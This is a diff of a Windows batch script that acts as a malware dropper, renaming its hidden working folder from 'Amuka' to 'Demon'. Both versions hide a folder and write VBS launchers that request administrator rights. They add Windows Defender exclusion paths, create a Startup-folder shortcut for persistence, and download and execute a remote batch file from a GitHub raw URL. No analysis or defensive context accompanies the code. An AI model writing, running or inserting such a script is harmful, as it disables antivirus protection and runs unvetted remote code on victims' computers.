@@ -1,21 +1,14 @@
 %homedrive%
-rmdir /s /q %homedrive%\Amuka
-mkdir %homedrive%\Amuka
-attrib +h %homedrive%\Amuka
-cd %homedrive%\Amuka
-echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Amuka\Akuma.vbs
-echo objShell.Run "%homedrive%\Amuka\Akuma.bat", 0, False >> %homedrive%\Amuka\Akuma.vbs
-echo cd %~dp0 >> %homedrive%\Amuka\Amuka.bat
-powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Amuka\Amuka.bat
-powershell Add-MpPreference -ExclusionPath "$env:homedrive\Amuka" >> %homedrive%\Amuka\Amuka.bat
-echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Amuka" >> %homedrive%\Amuka\Amuka.bat
-echo curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat >> %homedrive%\Amuka\Amuka.bat
-echo start %homedrive%\Amuka\Akuma.vbs >> %homedrive%\Amuka\Amuka.bat
-echo del "%userprofile%\Start Menu\Programs\Startup\Amuka.lnk" >> %homedrive%\Amuka\Amuka.bat
-echo rmdir /s /q %homedrive%\Amuka >> %homedrive%\Amuka\Amuka.bat
-echo Set app = CreateObject("Shell.Application") >> %homedrive%\Amuka\Amuka.vbs
-echo app.ShellExecute "%homedrive%\Amuka\Amuka.bat", , , "runas", 3 >> %homedrive%\Amuka\Amuka.vbs
-powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Amuka.lnk');$s.TargetPath='%homedrive%\Amuka\Amuka.vbs';$s.Save()"
-start %homedrive%\Amuka\Amuka.vbs
-curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat
-start %homedrive%\Amuka\Akuma.vbs
+rmdir /s /q %homedrive%\Demon
+mkdir %homedrive%\Demon
+attrib +h %homedrive%\Demon
+cd %homedrive%\Demon
+echo Set app = CreateObject("Shell.Application") >> %homedrive%\Demon\Demon.vbs
+echo app.ShellExecute "%homedrive%\Demon\Demon.bat", , , "runas", 3 >> %homedrive%\Demon\Demon.vbs
+powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Demon.lnk');$s.TargetPath='%homedrive%\Demon\Demon.vbs';$s.Save()"
+curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\Demon\Demon.bat
+echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Demon\Demon.bat
+echo del %appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Amuka.lnk >> %homedrive%\Demon\Demon.bat
+echo %homedrive%\Demon\Akuma.bat >> %homedrive%\Demon\Demon.bat
+echo rmdir /s /q %homedrive%\Demon >> %homedrive%\Demon\Demon.bat
+start %homedrive%\Demon\Demon.vbs
